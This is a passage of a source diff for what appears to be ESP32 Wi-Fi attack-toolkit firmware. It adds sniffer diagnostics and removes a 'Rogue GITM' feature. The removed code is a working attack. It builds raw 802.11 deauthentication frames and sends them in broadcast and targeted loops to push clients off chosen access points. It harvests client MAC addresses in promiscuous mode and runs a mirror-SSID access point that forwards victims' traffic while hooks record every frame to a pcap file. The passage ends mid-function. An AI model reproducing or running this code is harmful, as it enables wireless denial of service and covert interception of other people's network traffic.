@@ -34,7 +34,6 @@
 #include "frame_analyzer_types.h"
 #include "frame_analyzer_parser.h"
 #include "pcap_serializer.h"
-#include "capture_gateway.h"
 #include "hccapx_serializer.h"
 #include <math.h>
 #include <fcntl.h>
@@ -69,7 +68,6 @@
 #include "lwip/pbuf.h"
 #include "lwip/prot/ethernet.h"
 #include "esp_netif.h"
-#include "esp_wifi_default.h"   // esp_netif_create_default_wifi_ap (Rogue GITM)
 #include "esp_netif_net_stack.h"
 
 // TLS (WPA-SEC upload)
@@ -249,37 +247,6 @@ static uint8_t       g_tz_index       = 0;        // NVS-backed timezone index (
 static lv_obj_t     *clock_label      = NULL;     // status-bar clock (main header)
 static lv_obj_t     *time_live_label  = NULL;     // Time settings: big live clock label
 static lv_timer_t   *time_live_timer  = NULL;     // Time settings: 1 Hz refresh timer
-// Rogue GITM (Capture Gateway) UI/state — declared here so page teardown in
-// reset_function_page_children can reach them (defined logic is far below).
-// Live view mirrors Tab5's Step-3 session view (state chip, AP/uplink/NAPT header,
-// open-AP warning, client MAC list, capture pkts/size, recorder health).
-static lv_obj_t     *gitm_status_label = NULL;   // shared hint / error line
-static lv_obj_t     *gitm_state_chip   = NULL;   // IDLE/CONNECTING/STARTING/RUNNING
-static lv_obj_t     *gitm_live_hdr     = NULL;   // AP / uplink / NAPT-DNS block
-static lv_obj_t     *gitm_warn_lbl     = NULL;   // open-AP warning
-static lv_obj_t     *gitm_clients_hdr  = NULL;   // "Clients (N)"
-static lv_obj_t     *gitm_clients_list = NULL;   // MAC rows
-static lv_obj_t     *gitm_cap_label    = NULL;   // pcap name / pkts / size
-static lv_obj_t     *gitm_rec_label    = NULL;   // recorder health
-static lv_timer_t   *gitm_timer        = NULL;
-static volatile bool gitm_active       = false;
-static char          gitm_pcap_path[64] = "";
-static char          gitm_client_sig[8 * 18 + 8] = "";  // change-detect the client set
-static int           gitm_state         = 0;     // gitm_state_t (see the GITM block)
-// Rogue GITM AP config (Tab5 Step 2): the SoftAP the victims join. Editable so it
-// can differ from the uplink (a distinct name is visible; an exact copy = mirror).
-static char          gitm_ap_ssid[33]  = "";
-static char          gitm_ap_pass[64]  = "";
-static bool          gitm_ap_open      = false;   // true = open AP (no password)
-static int           gitm_deauth_mode  = 0;       // 0=off, 1=broadcast victims, 2=targeted clients
-static lv_obj_t     *gitm_cfg_ssid_ta  = NULL;
-static lv_obj_t     *gitm_cfg_pw_ta    = NULL;
-static lv_obj_t     *gitm_cfg_sec_dd   = NULL;
-static lv_obj_t     *gitm_cfg_deauth_dd = NULL;
-static lv_obj_t     *gitm_cfg_pw_lbl   = NULL;   // "Password:" label (hidden with the field)
-static lv_obj_t     *gitm_cfg_pw_eye   = NULL;   // show/hide toggle button
-static lv_obj_t     *gitm_cfg_pw_eye_lbl = NULL;
-static lv_obj_t     *gitm_cfg_kb       = NULL;
 // Timezone table + time helpers are defined in the DS3231 block far below, but
 // the Time settings UI (above it) needs them — declare them here.
 typedef struct { const char *name; const char *posix; } tz_option_t;
@@ -548,6 +515,8 @@ static uint8_t     inspect_bssid[SCAN_RESULTS_MAX_DISPLAY][6];
 static uint8_t     inspect_chan[SCAN_RESULTS_MAX_DISPLAY];
 static int         inspect_count = 0;
 static volatile bool inspect_active = false;
+static volatile uint32_t inspect_mgmt_total = 0;    // diag: all MGMT frames the cb saw
+static volatile uint32_t inspect_beacon_total = 0;  // diag: all beacons (any BSSID)
 static TaskHandle_t inspect_task_handle = NULL;
 static StackType_t *inspect_task_stack = NULL;
 static StaticTask_t inspect_task_buf;
@@ -557,11 +526,13 @@ static void inspect_beacon_cb(void *buf, wifi_promiscuous_pkt_type_t type)
 {
     if (!g_inspect.active) return;
     if (type != WIFI_PKT_MGMT) return;
+    inspect_mgmt_total++;                                    // diag
     const wifi_promiscuous_pkt_t *f = (const wifi_promiscuous_pkt_t *)buf;
     int total = (int)f->rx_ctrl.sig_len;
     if (total < 24 + 12) return;
     const uint8_t *pl = f->payload;
     if ((pl[0] & 0xFC) != 0x80) return;                     // beacon (type 0 / subtype 8)
+    inspect_beacon_total++;                                  // diag
     if (memcmp(pl + 16, g_inspect.bssid, 6) != 0) return;   // Addr3 = BSSID
     const uint8_t *body = pl + 24;
     int body_len = total - 24;
@@ -620,10 +591,17 @@ static void inspect_task(void *arg)
     // AP. esp_wifi_set_channel only takes effect while promiscuous is on, and
     // without the MGMT filter the driver never delivers beacons to our callback —
     // both were the reason MFP stayed "?".
+    inspect_mgmt_total = 0;
+    inspect_beacon_total = 0;
+    wifi_mode_t imode = WIFI_MODE_NULL;
+    esp_wifi_get_mode(&imode);
+    esp_err_t pr = esp_wifi_set_promiscuous(false);   // clear any prior sniffer state first
     wifi_promiscuous_filter_t ifilt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
     esp_wifi_set_promiscuous_filter(&ifilt);
     esp_wifi_set_promiscuous_rx_cb(inspect_beacon_cb);
-    esp_wifi_set_promiscuous(true);
+    pr = esp_wifi_set_promiscuous(true);
+    ESP_LOGI(TAG, "inspect_task start: count=%d wifi_mode=%d promisc_ret=%s",
+             inspect_count, (int)imode, esp_err_to_name(pr));
 
     int sweeps = 0;
     while (inspect_active) {
@@ -640,6 +618,14 @@ static void inspect_task(void *arg)
             }
             g_inspect.active = false;
             if (!inspect_active) break;          // cancelled: leave the radio to the next owner
+
+            {   // diag: did the channel change, and is promiscuous delivering frames?
+                uint8_t cur_ch = 0; wifi_second_chan_t sc;
+                esp_wifi_get_channel(&cur_ch, &sc);
+                ESP_LOGI(TAG, "inspect AP%d want-ch=%u got-ch=%u beacons=%lu mgmt=%lu bcn_any=%lu",
+                         i, inspect_chan[i], cur_ch, (unsigned long)g_inspect.beacons_seen,
+                         (unsigned long)inspect_mgmt_total, (unsigned long)inspect_beacon_total);
+            }
 
             const uint8_t *b = inspect_bssid[i];
             uint8_t oui3[3] = { b[0], b[1], b[2] };
@@ -1281,7 +1267,6 @@ static char portal_selected_html_name[64] = "";
 #define PENDING_ATTACK_MITM         3
 #define PENDING_ATTACK_NMAP         4
 #define PENDING_ATTACK_WIGLE        5
-#define PENDING_ATTACK_GITM         6
 static int pending_attack_type = 0;
 static char wifi_connect_ssid[33] = "";
 static char wifi_connect_password[64] = "";
@@ -1664,7 +1649,6 @@ static void screenshot_save_task(void *arg);
 static void wp_teardown(void);
 
 static void radar_stop_locator(void);   // defined with the AP Radar block below
-static void gitm_stop(void);            // defined with the Rogue GITM block below
 
 // Reset all child pointers when function_page is deleted
 static void reset_function_page_children(void) {
@@ -1797,24 +1781,6 @@ static void reset_function_page_children(void) {
     // Time settings: kill the live-clock refresh timer on any nav away.
     if (time_live_timer) { lv_timer_del(time_live_timer); time_live_timer = NULL; }
     time_live_label = NULL;
-    // Rogue GITM: tear down the capture gateway + pcap + SoftAP on any nav away.
-    if (gitm_active) gitm_stop();
-    gitm_status_label = NULL;
-    gitm_state_chip = NULL;
-    gitm_live_hdr = NULL;
-    gitm_warn_lbl = NULL;
-    gitm_clients_hdr = NULL;
-    gitm_clients_list = NULL;
-    gitm_cap_label = NULL;
-    gitm_rec_label = NULL;
-    gitm_cfg_ssid_ta = NULL;
-    gitm_cfg_pw_ta = NULL;
-    gitm_cfg_sec_dd = NULL;
-    gitm_cfg_deauth_dd = NULL;
-    gitm_cfg_pw_lbl = NULL;
-    gitm_cfg_pw_eye = NULL;
-    gitm_cfg_pw_eye_lbl = NULL;
-    gitm_cfg_kb = NULL;
     // BLE HoneyPair: stop advertising on any nav away (title back button included)
     if (hp_screen_active) {
         honeypair_stop();
@@ -2023,11 +1989,6 @@ static void show_arp_poison_page(void);
 static void show_rogue_ap_page(void);
 static void show_wpa_sec_upload_page(void);
 static void show_mitm_page(void);
-// Rogue GITM (Capture Gateway) — routed STA↔SoftAP NAPT gateway + pcap capture.
-// (gitm_stop is forward-declared earlier, above reset_function_page_children.)
-static void show_gitm_page(void);
-static void show_gitm_config_page(void);              // Tab5-style Step 2: name the AP + security
-static bool upload_wait_for_sta_ip(int timeout_ms);   // shared STA DHCP wait (defined below)
 static void stop_arp_ban(void);
 
 // WPA-SEC upload helpers
@@ -12603,7 +12564,7 @@ static bool attack_is_offensive(const char *name)
     static const char *offensive[] = {
         "Blackout", "Handshakes", "Handshaker", "Portal", "Snifferdog",
         "Beacon Spam", "Deauth", "Evil Twin", "SAE Overflow",
-        "ARP Poison", "MITM", "Rogue AP", "Rogue GITM",
+        "ARP Poison", "MITM", "Rogue AP",
     };
     for (size_t i = 0; i < sizeof(offensive) / sizeof(offensive[0]); i++)
         if (strcmp(name, offensive[i]) == 0) return true;
@@ -12683,17 +12644,6 @@ static void attack_tile_event_cb(lv_event_t *e)
     } else if (strcmp(attack_name, "Sniffer") == 0) {
         // Auto-start Network Observer directly (no confirmation)
         sniffer_yes_btn_cb(NULL);
-    } else if (strcmp(attack_name, "Rogue GITM") == 0) {
-        // Rogue GITM allows ≥1 selected: the FIRST selection is the uplink+mirror
-        // (STA joins it and we mirror its SSID); any OTHER selected networks on the
-        // same channel become deauth victims (rogue overlay). The connect screen
-        // targets the first selection, so no separate uplink picker is needed.
-        int gsel[SCAN_RESULTS_MAX_DISPLAY];
-        int gcount = wifi_scanner_get_selected(gsel, SCAN_RESULTS_MAX_DISPLAY);
-        if (gcount >= 1) {
-            pending_attack_type = PENDING_ATTACK_GITM;
-            show_wifi_connect_screen();
-        }
     } else if (strcmp(attack_name, "ARP Poison") == 0 ||
                strcmp(attack_name, "MITM") == 0 ||
                strcmp(attack_name, "Rogue AP") == 0 ||
@@ -13192,9 +13142,6 @@ static void wifi_connect_next_btn_cb(lv_event_t *e)
             break;
         case PENDING_ATTACK_WIGLE:
             show_wigle_upload_page();
-            break;
-        case PENDING_ATTACK_GITM:
-            show_gitm_config_page();   // name the AP / security, then the live gateway
             break;
         default:
             break;
@@ -14663,873 +14610,6 @@ static void show_mitm_page(void)
     mitm_scan_check_timer = lv_timer_create(mitm_scan_check_timer_cb, 200, NULL);
 }
 
-// ============================================================================
-// Rogue GITM (Capture Gateway) — routed STA-uplink ↔ mirror-SoftAP NAPT gateway
-// with live pcap capture. Backend: the projectZero capture_gateway component
-// (NAPT/DHCP/DNS). Victims that join the mirror SSID get real Internet via our
-// STA uplink while every frame is recorded. The packet-capture reuses the MITM
-// engine (mitm_netif_*_hook / mitm_pcap_writer_task) pointed at the AP netif;
-// GITM and MITM never run at once, so sharing that state is safe.
-// (gitm_status_label/…/gitm_active/gitm_pcap_path are declared near the top so
-// reset_function_page_children can reach them.)
-// ============================================================================
-
-// Rogue overlay: broadcast-deauth the victim AP(s) so their clients roam to our
-// same-SSID mirror. Frame layout matches wifi_attacks' deauth_frame_template
-// (DA broadcast, SA/BSSID = victim, reason "unspecified"). We only ever deauth
-// victims whose BSSID differs from our STA uplink and that sit on our locked
-// channel, so the deauth can never knock our own uplink offline.
-static const uint8_t gitm_deauth_tmpl[26] = {
-    0xC0, 0x00, 0x00, 0x00,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // DA: broadcast
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // SA: victim BSSID (filled per target)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID: victim BSSID (filled per target)
-    0x00, 0x00, 0x01, 0x00                // seq + reason 1 (unspecified)
-};
-#define GITM_MAX_VICTIMS 8
-static TaskHandle_t   gitm_deauth_task_handle = NULL;
-static volatile bool  gitm_deauth_active = false;
-static uint8_t        gitm_victim_bssids[GITM_MAX_VICTIMS][6];
-static volatile uint8_t gitm_victim_count = 0;
-
-static void gitm_deauth_task(void *arg)
-{
-    (void)arg;
-    uint8_t f[sizeof(gitm_deauth_tmpl)];
-    while (gitm_deauth_active && gitm_active) {
-        for (int v = 0; v < gitm_victim_count; v++) {
-            memcpy(f, gitm_deauth_tmpl, sizeof(f));
-            memcpy(&f[10], gitm_victim_bssids[v], 6);   // SA
-            memcpy(&f[16], gitm_victim_bssids[v], 6);   // BSSID
-            for (int k = 0; k < 3; k++) {
-                esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
-                vTaskDelay(pdMS_TO_TICKS(2));
-            }
-        }
-        vTaskDelay(pdMS_TO_TICKS(250));
-    }
-    gitm_deauth_task_handle = NULL;
-    vTaskDelete(NULL);
-}
-
-// Build the victim list from the scan selection (all but the uplink, same channel)
-// and start the deauth task. Returns the number of victims armed.
-static int gitm_deauth_start(void)
-{
-    int sel[SCAN_RESULTS_MAX_DISPLAY];
-    int n = wifi_scanner_get_selected(sel, SCAN_RESULTS_MAX_DISPLAY);
-    const wifi_ap_record_t *recs = wifi_scanner_get_results_ptr();
-    const uint16_t *cptr = wifi_scanner_get_count_ptr();
-    uint16_t total = cptr ? *cptr : 0;
-    gitm_victim_count = 0;
-    if (!recs) return 0;
-    for (int i = 0; i < n && gitm_victim_count < GITM_MAX_VICTIMS; i++) {
-        if (sel[i] < 0 || sel[i] >= (int)total) continue;
-        const wifi_ap_record_t *ap = &recs[sel[i]];
-        if (memcmp(ap->bssid, wifi_connect_bssid, 6) == 0) continue;  // never the uplink (self-kill)
-        if (ap->primary != wifi_connect_channel) continue;           // must share our locked channel
-        memcpy(gitm_victim_bssids[gitm_victim_count++], ap->bssid, 6);
-    }
-    if (gitm_victim_count == 0) return 0;
-    gitm_deauth_active = true;
-    if (xTaskCreate(gitm_deauth_task, "gitm_deauth", 3072, NULL, 5, &gitm_deauth_task_handle) != pdPASS) {
-        gitm_deauth_active = false;
-        gitm_deauth_task_handle = NULL;
-        return 0;
-    }
-    return gitm_victim_count;
-}
-
-static void gitm_deauth_stop(void)
-{
-    gitm_deauth_active = false;
-    for (int i = 0; i < 40 && gitm_deauth_task_handle != NULL; i++) vTaskDelay(pdMS_TO_TICKS(10));
-    if (gitm_deauth_task_handle) { vTaskDelete(gitm_deauth_task_handle); gitm_deauth_task_handle = NULL; }
-    gitm_victim_count = 0;
-}
-
-// ---- Targeted (unicast) client deauth (mode B) -----------------------------
-// Promiscuous-discover the clients of the target AP(s) on our locked channel and
-// unicast-deauth each (dest = client, then dest = AP for the reverse) — never a
-// broadcast, and never our own STA MAC — so it forces roaming without dropping our
-// own uplink. Runs alongside the live gateway (extra radio load; see the note in
-// project memory about promiscuous + NAPT coexistence).
-#define GITM_TD_MAX_CLIENTS 16
-static volatile bool gitm_td_active = false;
-static TaskHandle_t  gitm_td_task_handle = NULL;
-static uint8_t  gitm_td_targets[GITM_MAX_VICTIMS][6];
-static int      gitm_td_target_count = 0;
-static uint8_t  gitm_td_clients[GITM_TD_MAX_CLIENTS][6];
-static uint8_t  gitm_td_client_ap[GITM_TD_MAX_CLIENTS][6];
-static volatile int gitm_td_client_count = 0;
-static portMUX_TYPE gitm_td_mux = portMUX_INITIALIZER_UNLOCKED;
-static uint8_t  gitm_td_own_sta[6], gitm_td_own_ap[6];
-
-static bool gitm_td_is_target(const uint8_t *m) {
-    for (int i = 0; i < gitm_td_target_count; i++)
-        if (memcmp(m, gitm_td_targets[i], 6) == 0) return true;
-    return false;
-}
-static void gitm_td_add_client(const uint8_t *client, const uint8_t *bssid) {
-    if (client[0] & 0x01) return;                              // multicast/broadcast
-    if (memcmp(client, gitm_td_own_sta, 6) == 0) return;       // never ourselves
-    if (memcmp(client, gitm_td_own_ap, 6) == 0) return;
-    portENTER_CRITICAL(&gitm_td_mux);
-    for (int i = 0; i < gitm_td_client_count; i++) {
-        if (memcmp(gitm_td_clients[i], client, 6) == 0) { portEXIT_CRITICAL(&gitm_td_mux); return; }
-    }
-    if (gitm_td_client_count < GITM_TD_MAX_CLIENTS) {
-        memcpy(gitm_td_clients[gitm_td_client_count], client, 6);
-        memcpy(gitm_td_client_ap[gitm_td_client_count], bssid, 6);
-        gitm_td_client_count++;
-    }
-    portEXIT_CRITICAL(&gitm_td_mux);
-}
-// Harvest client MACs seen talking to a target BSSID (data + mgmt frames).
-static void gitm_td_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
-    if (!gitm_td_active) return;
-    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
-    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
-    if (p->rx_ctrl.sig_len < 24) return;
-    const uint8_t *fr = p->payload;
-    uint8_t ftype = (fr[0] >> 2) & 0x3;
-    const uint8_t *a1 = fr + 4, *a2 = fr + 10, *a3 = fr + 16;
-    const uint8_t *bssid = NULL, *client = NULL;
-    if (ftype == 2) {                                          // data
-        bool tods = fr[1] & 0x01, fromds = fr[1] & 0x02;
-        if (tods && !fromds)       { bssid = a1; client = a2; }
-        else if (!tods && fromds)  { bssid = a2; client = a1; }
-        else return;
-    } else if (ftype == 0) {                                   // mgmt: a3=BSSID, a2=SA
-        bssid = a3; client = a2;
-        if (memcmp(client, bssid, 6) == 0) return;             // the AP's own frame
-    } else return;
-    if (!gitm_td_is_target(bssid)) return;
-    gitm_td_add_client(client, bssid);
-}
-// Unicast deauth only (both directions); neither frame is addressed to our STA.
-static void gitm_td_send(const uint8_t *client, const uint8_t *bssid) {
-    uint8_t f[26] = { 0xC0, 0x00, 0x00, 0x00,
-                      0, 0, 0, 0, 0, 0,  0, 0, 0, 0, 0, 0,  0, 0, 0, 0, 0, 0,
-                      0x00, 0x00, 0x07, 0x00 };
-    memcpy(&f[4], client, 6); memcpy(&f[10], bssid, 6); memcpy(&f[16], bssid, 6);   // AP -> client
-    for (int i = 0; i < 3; i++) { esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false); vTaskDelay(pdMS_TO_TICKS(2)); }
-    memcpy(&f[4], bssid, 6);  memcpy(&f[10], client, 6); memcpy(&f[16], bssid, 6);  // client -> AP
-    for (int i = 0; i < 3; i++) { esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false); vTaskDelay(pdMS_TO_TICKS(2)); }
-}
-static void gitm_td_task(void *arg) {
-    (void)arg;
-    while (gitm_td_active && gitm_active) {
-        int cnt;
-        uint8_t cl[GITM_TD_MAX_CLIENTS][6], ap[GITM_TD_MAX_CLIENTS][6];
-        portENTER_CRITICAL(&gitm_td_mux);
-        cnt = gitm_td_client_count;
-        memcpy(cl, gitm_td_clients, (size_t)cnt * 6);
-        memcpy(ap, gitm_td_client_ap, (size_t)cnt * 6);
-        portEXIT_CRITICAL(&gitm_td_mux);
-        for (int i = 0; i < cnt && gitm_td_active; i++) gitm_td_send(cl[i], ap[i]);
-        vTaskDelay(pdMS_TO_TICKS(cnt ? 500 : 800));
-    }
-    gitm_td_task_handle = NULL;
-    vTaskDelete(NULL);
-}
-static int gitm_td_start(void) {
-    int sel[SCAN_RESULTS_MAX_DISPLAY];
-    int n = wifi_scanner_get_selected(sel, SCAN_RESULTS_MAX_DISPLAY);
-    const wifi_ap_record_t *recs = wifi_scanner_get_results_ptr();
-    const uint16_t *cptr = wifi_scanner_get_count_ptr();
-    uint16_t total = cptr ? *cptr : 0;
-    gitm_td_target_count = 0;
-    if (recs) {
-        for (int i = 0; i < n && gitm_td_target_count < GITM_MAX_VICTIMS; i++) {
-            if (sel[i] < 0 || sel[i] >= (int)total) continue;
-            const wifi_ap_record_t *ap = &recs[sel[i]];
-            if (ap->primary != wifi_connect_channel) continue;   // must be on our locked channel
-            memcpy(gitm_td_targets[gitm_td_target_count++], ap->bssid, 6);
-        }
-    }
-    if (gitm_td_target_count == 0) return 0;
-    esp_wifi_get_mac(WIFI_IF_STA, gitm_td_own_sta);
-    esp_wifi_get_mac(WIFI_IF_AP, gitm_td_own_ap);
-    gitm_td_client_count = 0;
-    gitm_td_active = true;
-    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
-    esp_wifi_set_promiscuous_filter(&filt);
-    esp_wifi_set_promiscuous_rx_cb(gitm_td_cb);
-    esp_wifi_set_promiscuous(true);
-    if (xTaskCreate(gitm_td_task, "gitm_td", 3072, NULL, 5, &gitm_td_task_handle) != pdPASS) {
-        gitm_td_active = false; gitm_td_task_handle = NULL;
-        esp_wifi_set_promiscuous(false);
-        return 0;
-    }
-    return gitm_td_target_count;
-}
-static void gitm_td_stop(void) {
-    if (!gitm_td_active && gitm_td_task_handle == NULL) return;
-    gitm_td_active = false;
-    for (int i = 0; i < 40 && gitm_td_task_handle != NULL; i++) vTaskDelay(pdMS_TO_TICKS(10));
-    if (gitm_td_task_handle) { vTaskDelete(gitm_td_task_handle); gitm_td_task_handle = NULL; }
-    esp_wifi_set_promiscuous(false);
-    gitm_td_client_count = 0;
-    gitm_td_target_count = 0;
-}
-
-// Install the pcap tap on the AP netif and start the writer (mirrors mitm start).
-static bool gitm_capture_start(esp_netif_t *ap_netif)
-{
-    if (!ap_netif) return false;
-    mkdir("/sdcard/lab", 0775);
-    mkdir("/sdcard/lab/pcaps", 0775);
-    int n = mitm_find_next_pcap_number();
-    snprintf(gitm_pcap_path, sizeof(gitm_pcap_path), "/sdcard/lab/pcaps/gitm_%d.pcap", n);
-
-    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
-    mitm_pcap_file = fopen(gitm_pcap_path, "wb");
-    if (mitm_pcap_file) {
-        pcap_global_header_t ghdr = {
-            .magic_number = 0xa1b2c3d4, .version_major = 2, .version_minor = 4,
-            .thiszone = 0, .sigfigs = 0, .snaplen = 65535, .network = LINKTYPE_ETHERNET
-        };
-        fwrite(&ghdr, 1, sizeof(ghdr), mitm_pcap_file);
-        fflush(mitm_pcap_file);
-    }
-    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
-    if (!mitm_pcap_file) return false;
-
-    mitm_packet_queue = xQueueCreate(MITM_QUEUE_SIZE, sizeof(mitm_queued_frame_t *));
-    if (!mitm_packet_queue) {
-        fclose(mitm_pcap_file); mitm_pcap_file = NULL; return false;
-    }
-    mitm_frame_count = mitm_drop_count = 0;
-    mitm_tcp_count = mitm_udp_count = mitm_icmp_count = mitm_arp_pkt_count = mitm_other_proto_count = 0;
-    mitm_capture_active = true;
-
-    struct netif *lwip_ap = esp_netif_get_netif_impl(ap_netif);
-    if (lwip_ap) {
-        mitm_original_input = lwip_ap->input;
-        mitm_original_linkoutput = lwip_ap->linkoutput;
-        lwip_ap->input = mitm_netif_input_hook;
-        lwip_ap->linkoutput = mitm_netif_linkoutput_hook;
-    }
-
-    static StackType_t *gitm_wr_stack = NULL;
-    static StaticTask_t gitm_wr_tcb;
-    if (!gitm_wr_stack)
-        gitm_wr_stack = heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
-    if (gitm_wr_stack)
-        mitm_writer_task_handle = xTaskCreateStatic(mitm_pcap_writer_task, "gitm_wr", 8192,
-                                                    NULL, 5, gitm_wr_stack, &gitm_wr_tcb);
-    else
-        xTaskCreate(mitm_pcap_writer_task, "gitm_wr", 8192, NULL, 5, &mitm_writer_task_handle);
-    return true;
-}
-
-// Restore the AP-netif hooks, stop the writer, close the pcap.
-static void gitm_capture_stop(void)
-{
-    mitm_capture_active = false;
-    esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-    if (ap) {
-        struct netif *lwip_ap = esp_netif_get_netif_impl(ap);
-        if (lwip_ap) {
-            if (mitm_original_input)     { lwip_ap->input = mitm_original_input; mitm_original_input = NULL; }
-            if (mitm_original_linkoutput){ lwip_ap->linkoutput = mitm_original_linkoutput; mitm_original_linkoutput = NULL; }
-        }
-    }
-    for (int i = 0; i < 100 && mitm_writer_task_handle != NULL; i++) vTaskDelay(pdMS_TO_TICKS(50));
-    if (mitm_writer_task_handle) { vTaskDelete(mitm_writer_task_handle); mitm_writer_task_handle = NULL; }
-    if (mitm_pcap_file) {
-        if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
-        fflush(mitm_pcap_file); fclose(mitm_pcap_file); mitm_pcap_file = NULL; sd_sync();
-        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
-    }
-    if (mitm_packet_queue) {
-        mitm_queued_frame_t *f = NULL;
-        while (xQueueReceive(mitm_packet_queue, &f, 0) == pdTRUE) heap_caps_free(f);
-        vQueueDelete(mitm_packet_queue);
-        mitm_packet_queue = NULL;
-    }
-}
-
-static void gitm_stop(void)
-{
-    if (!gitm_active) return;
-    gitm_active = false;
-    gitm_deauth_stop();
-    gitm_td_stop();
-    if (gitm_timer) { lv_timer_del(gitm_timer); gitm_timer = NULL; }
-    gitm_capture_stop();
-    capture_gateway_stop();
-    esp_wifi_set_mode(WIFI_MODE_STA);   // keep the STA uplink, drop the SoftAP
-    gitm_status_label = gitm_state_chip = gitm_live_hdr = gitm_warn_lbl = NULL;
-    gitm_clients_hdr = gitm_clients_list = gitm_cap_label = gitm_rec_label = NULL;
-    ESP_LOGI(TAG, "Rogue GITM: stopped");
-}
-
-static void gitm_stop_btn_cb(lv_event_t *e)
-{
-    (void)e;
-    gitm_stop();
-    nav_to_menu_flag = true;
-}
-// Back: tear down the gateway but return to the Setup screen (STA uplink stays up)
-// so the user can change the AP name / security / deauth and retry.
-static void gitm_back_btn_cb(lv_event_t *e)
-{
-    (void)e;
-    gitm_stop();
-    show_gitm_config_page();
-}
-
-// ---- Tab5-style session state chip ----
-enum { GITM_ST_IDLE = 0, GITM_ST_CONNECTING, GITM_ST_STARTING, GITM_ST_RUNNING,
-       GITM_ST_STOPPED, GITM_ST_ERROR };
-static const char *gitm_state_name(int st) {
-    switch (st) {
-        case GITM_ST_CONNECTING: return "CONNECTING";
-        case GITM_ST_STARTING:   return "STARTING";
-        case GITM_ST_RUNNING:    return "RUNNING";
-        case GITM_ST_STOPPED:    return "STOPPED";
-        case GITM_ST_ERROR:      return "ERROR";
-        default:                 return "IDLE";
-    }
-}
-static lv_color_t gitm_state_color(int st) {
-    switch (st) {
-        case GITM_ST_RUNNING:    return COLOR_MATERIAL_GREEN;
-        case GITM_ST_CONNECTING:
-        case GITM_ST_STARTING:   return COLOR_MATERIAL_AMBER;
-        case GITM_ST_ERROR:      return COLOR_MATERIAL_RED;
-        default:                 return lv_color_make(136, 136, 136);
-    }
-}
-static void gitm_set_state(int st) {
-    gitm_state = st;
-    if (gitm_state_chip && lv_obj_is_valid(gitm_state_chip)) {
-        lv_label_set_text(gitm_state_chip, gitm_state_name(st));
-        lv_obj_set_style_text_color(gitm_state_chip, gitm_state_color(st), 0);
-    }
-}
-
-// Rebuild the client MAC list only when the set changes (mirrors Tab5's approach).
-static void gitm_render_clients(void) {
-    if (!gitm_clients_list || !lv_obj_is_valid(gitm_clients_list)) return;
-    wifi_sta_list_t list;
-    if (esp_wifi_ap_get_sta_list(&list) != ESP_OK) return;
-    int n = list.num; if (n > 8) n = 8;
-    if (gitm_clients_hdr) lv_label_set_text_fmt(gitm_clients_hdr, "Clients (%d)", list.num);
-
-    char sig[8 * 18 + 8];
-    size_t pos = 0;
-    for (int i = 0; i < n && pos < sizeof(sig) - 20; i++) {
-        const uint8_t *m = list.sta[i].mac;
-        pos += snprintf(sig + pos, sizeof(sig) - pos, "%02X%02X%02X%02X%02X%02X|",
-                        m[0], m[1], m[2], m[3], m[4], m[5]);
-    }
-    sig[pos] = '\0';
-
-    if (strcmp(sig, gitm_client_sig) == 0) {                 // same set — just refresh RSSI
-        uint32_t c = lv_obj_get_child_cnt(gitm_clients_list);
-        for (int i = 0; i < n && (uint32_t)i < c; i++) {
-            lv_obj_t *row = lv_obj_get_child(gitm_clients_list, i);
-            const uint8_t *m = list.sta[i].mac;
-            if (row) lv_label_set_text_fmt(row, "%02X:%02X:%02X:%02X:%02X:%02X   %d dBm",
-                                           m[0], m[1], m[2], m[3], m[4], m[5], list.sta[i].rssi);
-        }
-        return;
-    }
-    snprintf(gitm_client_sig, sizeof(gitm_client_sig), "%s", sig);
-    lv_obj_clean(gitm_clients_list);
-    if (n == 0) {
-        lv_obj_t *e = lv_label_create(gitm_clients_list);
-        lv_label_set_text(e, "No client has joined yet.");
-        lv_obj_set_style_text_font(e, &lv_font_montserrat_14, 0);
-        lv_obj_set_style_text_color(e, lv_color_make(150, 150, 150), 0);
-        return;
-    }
-    for (int i = 0; i < n; i++) {
-        const uint8_t *m = list.sta[i].mac;
-        lv_obj_t *row = lv_label_create(gitm_clients_list);
-        lv_label_set_text_fmt(row, "%02X:%02X:%02X:%02X:%02X:%02X   %d dBm",
-                              m[0], m[1], m[2], m[3], m[4], m[5], list.sta[i].rssi);
-        lv_obj_set_style_text_font(row, &lv_font_montserrat_14, 0);
-        lv_obj_set_style_text_color(row, lv_color_make(221, 221, 221), 0);
-    }
-}
-
-static void gitm_timer_cb(lv_timer_t *t)
-{
-    (void)t;
-    if (!gitm_active) return;
-    capture_gateway_status_t st;
-    capture_gateway_get_status(&st);
-    if (!st.active) return;   // gateway not up (start failed) — keep the error hint
-
-    // AP / uplink / NAPT-DNS block (Tab5 live_hdr layout).
-    if (gitm_live_hdr) {
-        char dns[20] = "-";
-        if (st.upstream_dns.ip.type == ESP_IPADDR_TYPE_V4 && st.upstream_dns.ip.u_addr.ip4.addr)
-            snprintf(dns, sizeof(dns), IPSTR, IP2STR(&st.upstream_dns.ip.u_addr.ip4));
-        char upip[20] = "";
-        if (st.upstream_ip.ip.addr) snprintf(upip, sizeof(upip), IPSTR, IP2STR(&st.upstream_ip.ip));
-        lv_label_set_text_fmt(gitm_live_hdr,
-            "AP       %s  %s  ch %u\n"
-            "Uplink   %s  %s\n"
-            "NAPT %s   DNS %s%s",
-            st.ssid[0] ? st.ssid : gitm_ap_ssid, st.open_network ? "open" : "wpa2", st.channel,
-            st.upstream_ssid[0] ? st.upstream_ssid : "-",
